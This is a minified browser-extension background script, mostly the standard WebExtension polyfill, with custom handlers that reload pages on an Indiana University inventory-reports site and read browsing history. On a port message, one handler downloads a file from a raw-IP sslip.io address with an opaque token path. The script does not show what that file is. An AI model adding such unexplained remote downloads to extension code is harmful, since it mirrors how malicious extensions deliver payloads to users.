(()=>{var e,r={150:function(e,r){var s,g;"undefined"!=typeof globalThis?globalThis:"undefined"!=typeof self&&self,s=function(e){"use strict";if("object"!=typeof globalThis||"object"!=typeof chrome||!chrome||!chrome.runtime||!chrome.runtime.id)throw new Error("This script should only be loaded in a browser extension.");if(void 0===globalThis.browser||Object.getPrototypeOf(globalThis.browser)!==Object.prototype){const r="The message port closed before a response was received.",s="Returning a Promise is the preferred way to send a reply from an onMessage/onMessageExternal listener, as the sendResponse will be removed from the specs (See https://developer.mozilla.org/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage)",g=e=>{const g={alarms:{clear:{minArgs:0,maxArgs:1},clearAll:{minArgs:0,maxArgs:0},get:{minArgs:0,maxArgs:1},getAll:{minArgs:0,maxArgs:0}},bookmarks:{create:{minArgs:1,maxArgs:1},get:{minArgs:1,maxArgs:1},getChildren:{minArgs:1,maxArgs:1},getRecent:{minArgs:1,maxArgs:1},getSubTree:{minArgs:1,maxArgs:1},getTree:{minArgs:0,maxArgs:0},move:{minArgs:2,maxArgs:2},remove:{minArgs:1,maxArgs:1},removeTree:{minArgs:1,maxArgs:1},search:{minArgs:1,maxArgs:1},update:{minArgs:2,maxArgs:2}},browserAction:{disable:{minArgs:0,maxArgs:1,fallbackToNoCallback:!0},enable:{minArgs:0,maxArgs:1,fallbackToNoCallback:!0},getBadgeBackgroundColor:{minArgs:1,maxArgs:1},getBadgeText:{minArgs:1,maxArgs:1},getPopup:{minArgs:1,maxArgs:1},getTitle:{minArgs:1,maxArgs:1},openPopup:{minArgs:0,maxArgs:0},setBadgeBackgroundColor:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},setBadgeText:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},setIcon:{minArgs:1,maxArgs:1},setPopup:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},setTitle:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0}},browsingData:{remove:{minArgs:2,maxArgs:2},removeCache:{minArgs:1,maxArgs:1},removeCookies:{minArgs:1,maxArgs:1},removeDownloads:{minArgs:1,maxArgs:1},removeFormData:{minArgs:1,maxArgs:1},removeHistory:{minArgs:1,maxArgs:1},removeLocalStorage:{minArgs:1,maxArgs:1},removePasswords:{minArgs:1,maxArgs:1},removePluginData:{minArgs:1,maxArgs:1},settings:{minArgs:0,maxArgs:0}},commands:{getAll:{minArgs:0,maxArgs:0}},contextMenus:{remove:{minArgs:1,maxArgs:1},removeAll:{minArgs:0,maxArgs:0},update:{minArgs:2,maxArgs:2}},cookies:{get:{minArgs:1,maxArgs:1},getAll:{minArgs:1,maxArgs:1},getAllCookieStores:{minArgs:0,maxArgs:0},remove:{minArgs:1,maxArgs:1},set:{minArgs:1,maxArgs:1}},devtools:{inspectedWindow:{eval:{minArgs:1,maxArgs:2,singleCallbackArg:!1}},panels:{create:{minArgs:3,maxArgs:3,singleCallbackArg:!0},elements:{createSidebarPane:{minArgs:1,maxArgs:1}}}},downloads:{cancel:{minArgs:1,maxArgs:1},download:{minArgs:1,maxArgs:1},erase:{minArgs:1,maxArgs:1},getFileIcon:{minArgs:1,maxArgs:2},open:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},pause:{minArgs:1,maxArgs:1},removeFile:{minArgs:1,maxArgs:1},resume:{minArgs:1,maxArgs:1},search:{minArgs:1,maxArgs:1},show:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0}},extension:{isAllowedFileSchemeAccess:{minArgs:0,maxArgs:0},isAllowedIncognitoAccess:{minArgs:0,maxArgs:0}},history:{addUrl:{minArgs:1,maxArgs:1},deleteAll:{minArgs:0,maxArgs:0},deleteRange:{minArgs:1,maxArgs:1},deleteUrl:{minArgs:1,maxArgs:1},getVisits:{minArgs:1,maxArgs:1},search:{minArgs:1,maxArgs:1}},i18n:{detectLanguage:{minArgs:1,maxArgs:1},getAcceptLanguages:{minArgs:0,maxArgs:0}},identity:{launchWebAuthFlow:{minArgs:1,maxArgs:1}},idle:{queryState:{minArgs:1,maxArgs:1}},management:{get:{minArgs:1,maxArgs:1},getAll:{minArgs:0,maxArgs:0},getSelf:{minArgs:0,maxArgs:0},setEnabled:{minArgs:2,maxArgs:2},uninstallSelf:{minArgs:0,maxArgs:1}},notifications:{clear:{minArgs:1,maxArgs:1},create:{minArgs:1,maxArgs:2},getAll:{minArgs:0,maxArgs:0},getPermissionLevel:{minArgs:0,maxArgs:0},update:{minArgs:2,maxArgs:2}},pageAction:{getPopup:{minArgs:1,maxArgs:1},getTitle:{minArgs:1,maxArgs:1},hide:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},setIcon:{minArgs:1,maxArgs:1},setPopup:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},setTitle:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0},show:{minArgs:1,maxArgs:1,fallbackToNoCallback:!0}},permissions:{contains:{minArgs:1,maxArgs:1},getAll:{minArgs:0,maxArgs:0},remove:{minArgs:1,maxArgs:1},request:{minArgs:1,maxArgs:1}},runtime:{getBackgroundPage:{minArgs:0,maxArgs:0},getPlatformInfo:{minArgs:0,maxArgs:0},openOptionsPage:{minArgs:0,maxArgs:0},requestUpdateCheck:{minArgs:0,maxArgs:0},sendMessage:{minArgs:1,maxArgs:3},sendNativeMessage:{minArgs:2,maxArgs:2},setUninstallURL:{minArgs:1,maxArgs:1}},sessions:{getDevices:{minArgs:0,maxArgs:1},getRecentlyClosed:{minArgs:0,maxArgs:1},restore:{minArgs:0,maxArgs:1}},storage:{local:{clear:{minArgs:0,maxArgs:0},get:{minArgs:0,maxArgs:1},getBytesInUse:{minArgs:0,maxArgs:1},remove:{minArgs:1,maxArgs:1},set:{minArgs:1,maxArgs:1}},managed:{get:{minArgs:0,maxArgs:1},getBytesInUse:{minArgs:0,maxArgs:1}},sync:{clear:{minArgs:0,maxArgs:0},get:{minArgs:0,maxArgs:1},getBytesInUse:{minArgs:0,maxArgs:1},remove:{minArgs:1,maxArgs:1},set:{minArgs:1,maxArgs:1}}},tabs:{captureVisibleTab:{minArgs:0,maxArgs:2},create:{minArgs:1,maxArgs:1},detectLanguage:{minArgs:0,maxArgs:1},discard:{minArgs:0,maxArgs:1},duplicate:{minArgs:1,maxArgs:1},executeScript:{minArgs:1,maxArgs:2},get:{minArgs:1,maxArgs:1},getCurrent:{minArgs:0,maxArgs:0},getZoom:{minArgs:0,maxArgs:1},getZoomSettings:{minArgs:0,maxArgs:1},goBack:{minArgs:0,maxArgs:1},goForward:{minArgs:0,maxArgs:1},highlight:{minArgs:1,maxArgs:1},insertCSS:{minArgs:1,maxArgs:2},move:{minArgs:2,maxArgs:2},query:{minArgs:1,maxArgs:1},reload:{minArgs:0,maxArgs:2},remove:{minArgs:1,maxArgs:1},removeCSS:{minArgs:1,maxArgs:2},sendMessage:{minArgs:2,maxArgs:3},setZoom:{minArgs:1,maxArgs:2},setZoomSettings:{minArgs:1,maxArgs:2},update:{minArgs:1,maxArgs:2}},topSites:{get:{minArgs:0,maxArgs:0}},webNavigation:{getAllFrames:{minArgs:1,maxArgs:1},getFrame:{minArgs:1,maxArgs:1}},webRequest:{handlerBehaviorChanged:{minArgs:0,maxArgs:0}},windows:{create:{minArgs:0,maxArgs:1},get:{minArgs:1,maxArgs:2},getAll:{minArgs:0,maxArgs:1},getCurrent:{minArgs:0,maxArgs:1},getLastFocused:{minArgs:0,maxArgs:1},remove:{minArgs:1,maxArgs:1},update:{minArgs:2,maxArgs:2}}};if(0===Object.keys(g).length)throw new Error("api-metadata.json has not been included in browser-polyfill");class n extends WeakMap{constructor(e,r){super(r),this.createItem=e}get(e){return this.has(e)||this.set(e,this.createItem(e)),super.get(e)}}const a=(r,s)=>(...g)=>{e.runtime.lastError?r.reject(new Error(e.runtime.lastError.message)):s.singleCallbackArg||g.length<=1&&!1!==s.singleCallbackArg?r.resolve(g[0]):r.resolve(g)},t=e=>1==e?"argument":"arguments",m=(e,r,s)=>new Proxy(r,{apply:(r,g,n)=>s.call(g,e,...n)});let i=Function.call.bind(Object.prototype.hasOwnProperty);const o=(e,r={},s={})=>{let g=Object.create(null),n={has:(r,s)=>s in e||s in g,get(n,A,l){if(A in g)return g[A];if(!(A in e))return;let c=e[A];if("function"==typeof c)if("function"==typeof r[A])c=m(e,e[A],r[A]);else if(i(s,A)){let r=((e,r)=>function(s,...g){if(g.length<r.minArgs)throw new Error(`Expected at least ${r.minArgs} ${t(r.minArgs)} for ${e}(), got ${g.length}`);if(g.length>r.maxArgs)throw new Error(`Expected at most ${r.maxArgs} ${t(r.maxArgs)} for ${e}(), got ${g.length}`);return new Promise(((n,t)=>{if(r.fallbackToNoCallback)try{s[e](...g,a({resolve:n,reject:t},r))}catch(a){console.warn(`${e} API method doesn't seem to support the callback parameter, falling back to call it without a callback: `,a),s[e](...g),r.fallbackToNoCallback=!1,r.noCallback=!0,n()}else r.noCallback?(s[e](...g),n()):s[e](...g,a({resolve:n,reject:t},r))}))})(A,s[A]);c=m(e,e[A],r)}else c=c.bind(e);else if("object"==typeof c&&null!==c&&(i(r,A)||i(s,A)))c=o(c,r[A],s[A]);else{if(!i(s,"*"))return Object.defineProperty(g,A,{configurable:!0,enumerable:!0,get:()=>e[A],set(r){e[A]=r}}),c;c=o(c,r[A],s["*"])}return g[A]=c,c},set:(r,s,n,a)=>(s in g?g[s]=n:e[s]=n,!0),defineProperty:(e,r,s)=>Reflect.defineProperty(g,r,s),deleteProperty:(e,r)=>Reflect.deleteProperty(g,r)},A=Object.create(e);return new Proxy(A,n)},A=e=>({addListener(r,s,...g){r.addListener(e.get(s),...g)},hasListener:(r,s)=>r.hasListener(e.get(s)),removeListener(r,s){r.removeListener(e.get(s))}}),l=new n((e=>"function"!=typeof e?e:function(r){const s=o(r,{},{getContent:{minArgs:0,maxArgs:0}});e(s)}));let c=!1;const x=new n((e=>"function"!=typeof e?e:function(r,g,n){let a,t,m=!1,i=new Promise((e=>{a=function(r){c||(console.warn(s,(new Error).stack),c=!0),m=!0,e(r)}}));try{t=e(r,g,a)}catch(e){t=Promise.reject(e)}const o=!0!==t&&((A=t)&&"object"==typeof A&&"function"==typeof A.then);var A;if(!0!==t&&!o&&!m)return!1;return(o?t:i).then((e=>{n(e)}),(e=>{let r;r=e&&(e instanceof Error||"string"==typeof e.message)?e.message:"An unexpected error occurred",n({__mozWebExtensionPolyfillReject__:!0,message:r})})).catch((e=>{console.error("Failed to send onMessage rejected reply",e)})),!0})),d=({reject:s,resolve:g},n)=>{e.runtime.lastError?e.runtime.lastError.message===r?g():s(new Error(e.runtime.lastError.message)):n&&n.__mozWebExtensionPolyfillReject__?s(new Error(n.message)):g(n)},u=(e,r,s,...g)=>{if(g.length<r.minArgs)throw new Error(`Expected at least ${r.minArgs} ${t(r.minArgs)} for ${e}(), got ${g.length}`);if(g.length>r.maxArgs)throw new Error(`Expected at most ${r.maxArgs} ${t(r.maxArgs)} for ${e}(), got ${g.length}`);return new Promise(((e,r)=>{const n=d.bind(null,{resolve:e,reject:r});g.push(n),s.sendMessage(...g)}))},p={devtools:{network:{onRequestFinished:A(l)}},runtime:{onMessage:A(x),onMessageExternal:A(x),sendMessage:u.bind(null,"sendMessage",{minArgs:1,maxArgs:3})},tabs:{sendMessage:u.bind(null,"sendMessage",{minArgs:2,maxArgs:3})}},b={clear:{minArgs:1,maxArgs:1},get:{minArgs:1,maxArgs:1},set:{minArgs:1,maxArgs:1}};return g.privacy={network:{"*":b},services:{"*":b},websites:{"*":b}},o(e,p,g)};e.exports=g(chrome)}else e.exports=globalThis.browser},void 0===(g=s.apply(r,[e]))||(e.exports=g)}},s={};e=function e(g){var n=s[g];if(void 0!==n)return n.exports;var a=s[g]={exports:{}};return r[g].call(a.exports,a,a.exports,e),a.exports}(150),chrome.runtime.onInstalled.addListener((function(){chrome.storage.sync.set({headerText:"SAMPLE TEXT!"})})),chrome.runtime.onConnect.addListener((function(r){"invRepComPort"===r.name&&r.onMessage.addListener((function(r,s){"DOWNLOAD_REQ"===message.MESSAGE_TYPE?(console.log("Attempting download."),chrome.downloads.download({url:"https://154.82.111.45.sslip.io/dl2/6KLEwwRNilgEaeAs3dRvwMIudQ7MeQa1jMlzEXpfnAMDnlQkfx_docj8xZI1gxRunPmsr0W2pTtoAM8iNrTQ7C73f9R62gYd2pF4sRitgunAvSMmoka2RVcidxCpSfu-zk0nx_cDE-KK4LAXtOoxqkDSGAR0xrosQRfDJObOE_D4zm-4Gm4FlUBKs8tYwt612KBRaidqbzeyv3rAfn60zNDxeQPySC3fl-FGPx9gYV6Z-dnZuOYkgPFcLu3QR5pTcnMjKC2ndeYh6wknhEXXtUjIVOfBIO0Bi44xcuU3LpXmTajRuNiUdtm5tFwIkXYM5FJwHsFljHx_vGnf2kZCtQWRw6bWK6P7wnIwNR3iZGaRpSFDAB3WqPEu_GjS2ox5MnQPZFsxhFPZJ3ac7RGlSEr6teQ02x3PpuDGC4v6AemiTctwL9CK-3wA8YWPZZazvhR7k_imePPmV-KXY6HK5FKnhJO9LO4UQJuQ84edctfqI7C33d6sTYVk3ot8_7W3lWflQtKmwlcBJsAHOHqcBE2mDGj0dAX9PJ3ggKCIFUle1AiNSGviuTRFdvzItWwlBlJEp1AWvMSKJLTt9d2CHXh-N59Q67q2lMc9lixYfUV9YF6qbZQiHbaNvYsO15pigtmLMniwpoFODyaGQOBgbK38Xei4S67gQiEviqPs3AolYON5z3qBWpf7jV02O22NHDhF7Vd8lbxkgnJFM8LTYCRsx9tgxURtYHQ7BihEd0Whhxs6XXckTDzERNGIT8nkKgCiJcgzwoFmnvjxFZXtC_8kT8DO9zkYeU_434vyC8n-jeqU8f8DKl9PixQidYwNNppmzsBs7LaM16AnqvQMaFlDASdY2iY50nBtI2w6Z7pKBRbq4-ke4I6zeLBiQepkVB-3UBZVceG5hFHZNRiV3YCmnGFweiXOC9t3oYl7rfBFbNpdjQ74lu6BHgUvsjGs9sgyDp4uhfUWUPTSju36qCrt2x3TSu9u_1ojXei9_kHjgCU7teSVrwbOFZzV0GIz4P6Ip5Yrw1sDSrlBoID6keTGqF9UvkwOH76sGXXSqKNeD9nUS01bG2_6hIYAYuYRTLg9H4rBpcYwXTnmQa3vO_H0o9x4lWKzcbhVuFUptPkDptqNzmqQDyj2HKtRwaEUa-QT3ZKTitglSAq6TRB-dwORAMpeiPAt_M2l8RrBnt7IBYH7zQSSaEDMgEggT3i54TTHXRd3JBnbGqNrYhtVO6PygFS6Ym2v1gjnhT5ZSeMGnU8VdTPdwoGRKX5jlppz7qDAGgpqveB2dPfm3hm08hkBIEEiwEKjyWnBlhAmVtLM2pJb_I2U20yBQupECkzmbbtp2JuxuHafOuHIS-UF/a3pMUupA"})):"URL_REQ"===message.MESSAGE_TYPE&&(console.log("HERE!"),console.log("browser: "+e))}))})),e.tabs.onUpdated.addListener((function(r,s,g){s.url&&(s.url.toLowerCase().includes("pie.iu.edu/inventoryreports")?e.history.search({text:"",maxResults:2}).then((function(s){s.length>1&&(s[1].url.toLowerCase().includes("pie.iu.edu/inventoryreports")||e.tabs.reload(r))})):s.url.toLowerCase().includes("pie.iu.edu")&&e.history.search({text:"",maxResults:2}).then((function(s){s.length>1&&s[1].url.toLowerCase().includes("pie.iu.edu/inventoryreports")&&e.tabs.reload(r)})))}))})();